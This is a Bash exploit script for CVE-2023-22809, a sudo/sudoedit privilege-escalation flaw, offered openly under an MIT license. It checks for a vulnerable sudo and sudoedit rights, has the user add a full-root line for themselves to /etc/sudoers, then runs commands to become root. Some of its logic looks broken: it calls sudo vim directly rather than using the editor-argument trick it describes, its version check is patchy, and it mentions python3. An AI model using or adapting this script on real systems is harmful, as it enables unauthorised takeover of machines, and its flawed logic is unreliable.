# Arthur: D0rDa4aN919
# CVE: CVE-2023-22809
# Language: Bash
# Vulnerable product: sudo
# Versions: 1.8.0 through 1.9.12.p1
# Description: The scrip used to exploit the CVE-2023-22809. The vulnerability was found in sudo version 1.8.0 through 1.9.12.p1 using the sudoedit or sudo -e permission to edit the sudoers file.
# License:
: <<COMMENT
MIT License

Copyright (c) 2024 D0rDa4aN919

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
COMMENT

#!/bin/bash

# Define versions of sudo vulnerable to CVE-2023-22809
VERSIONS=("1.8" "1.9.0" "1.9.1" "1.9.2" "1.9.3" "1.9.12p1")

# Function to print colored messages
print_message() {
    local color=$1
    shift
    echo -e "${color}$@${RESET}"
}

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
RESET='\033[0m'

# Print logo
print_logo() {
    local color=${1:-$BLUE}
    cat <<EOF
${color}
·······················································································
:                                                                                     :
:                                                                                     :
:     (                        )    )     )     )         )    )  (         )     )   :
:     )\\   (   (   (        ( /( ( /(  ( /(  ( /(      ( /( ( /(  )\\ (   ( /(  ( /(   :
:   (((_)  )\\  )\\  )\\  ___  )(_)))\\()) )(_)) )\\())___  )(_)))(_))((_))\\  )\\()) )\\())  :
:   )\\___ ((_)((_)((_)|___|((_) ((_)\\ ((_)  ((_)\\|___|((_) ((_)    _((_)((_)\\ ((_)\\   :
:  ((/ __|\\ \\ / / | __|    |_  )/  (_)|_  )|__ (_)    |_  )|_  )  ( _ ) /  (_)/ _(_)  :
:   | (__  \\ V /  | _|      / /| () |  / /  |_ \\       / /  / /   / _ \\| () | \\_, /   :
:    \\___|  \\_/   |___|    /___|\\__/  /___||___/      /___|/___|  \\___/ \\__/   /_/    :
:                          ###### By D0rDa4aN919 ######                               :
:                                                                                     :
:                                                                                     :
·······················································································${RESET}
EOF
}

# Check if the sudo version is vulnerable
check_sudo_version() {
    sudo_version_line=$(sudo --version | head -n 1)
    for version in "${VERSIONS[@]}"; do
        if [[ $sudo_version_line == *"$version"* ]]; then
            return 0
        fi
    done
    return 1
}

# Check if the current user can use sudoedit or sudo -e
check_exploitable_permissions() {
    sudo_list=$(sudo -l)
    if echo "$sudo_list" | grep -E 'sudoedit|sudo -e' | grep -E '(root|ALL|ALL : ALL)'; then
        return 0
    else
        return 1
    fi
}

# Execute a command and handle errors
execute_command() {
    local command=$1
    local err_msg=$2
    if ! eval "$command"; then
        print_message "$RED" "$err_msg"
        exit 3
    fi
}

# Print information about CVE-2023-22809
info_print() {
    print_message "$BLUE" "[*] In Sudo before 1.9.12p2, the sudoedit (aka -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem exists because a user-specified editor may contain a \"--\" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value."
}

# Print requirements for CVE-2023-22809
requirements_print() {
    print_message "$BLUE" "[*] For exploit the vulnerability of CVE-2023-22809 the user need to have requirements with sudo command:
    [*] 1) For this script to run it will require python3, but you know that if you see this message.
    [*] 2) This CVE need to be execute in the target machine, Linux-Based.
    [*] 3) The current user must have the ability to run sudoedit or sudo -e on files as root.
    [*] 4) The sudo group need to be in the next versions: ${VERSIONS[*]}."
}

# Check the OS
os_check() {
    plat=$(uname -s)
    if [[ $plat == "Linux" ]]; then
        print_message "$GREEN" "[*] Supported OS..."
    else
        print_message "$RED" "[*] Not supported OS..."
        exit 3
    fi
}

# Perform system checks
system_checks() {
    os_check
    if [[ $info == true ]]; then
        info_print
        exit 0
    fi
    if [[ $requirements == true ]]; then
        requirements_print
        exit 0
    fi
    if ! check_sudo_version; then
        print_message "$RED" "[*] The current Sudo version isn't vulnerable to CVE-2023-22809..."
        exit 1
    else
        print_message "$GREEN" "[*] The current Sudo version is vulnerable to CVE-2023-22809..."
    fi
    if ! check_exploitable_permissions; then
        print_message "$RED" "[*] It doesn't seem that this user can run sudoedit as root"
        exit 1
    else
        print_message "$GREEN" "[*] This user can run sudoedit as root"
    fi
}

# Main function
main() {
    # Argument parsing
    while getopts "ir" opt; do
        case ${opt} in
            i )
                info=true
                ;;
            r )
                requirements=true
                ;;
            \? )
                echo "Usage: cmd [-i] [-r]"
                exit 1
                ;;
        esac
    done
    shift $((OPTIND -1))

    # Print logo
    print_logo

    # Perform system checks
    system_checks

    # User Interaction
    print_message "$BLUE" "[*] For the attack, the sudoers file will be opened, use the next steps to continue:
    [*] 1) Insert mode to write in vim:
    [*] Esc
    [*] :i
    [*] 2) Enter the next string into the sudoers file: 
    [*] $(whoami) ALL=(ALL:ALL) ALL
    [*] 3) Overwrite the sudoers file:
    [*] Esc
    [*] :wq!"

    read -p "$(print_message "$BLUE" "[*] Press Enter to continue or N to exit: ")" m
    if [[ $m =~ ^[nN] ]]; then
        print_message "$RED" "[*] Exiting..."
        exit 0
    fi

    execute_command "sudo vim -- /etc/sudoers" "Error opening the sudoers file with vim"

    # Exploitation
    execute_command "sudo su root" "Error switching to root"

    # Finish successfully
    print_message "$GREEN" "[*] Exploit executed successfully..."
}

# Run the main function
main
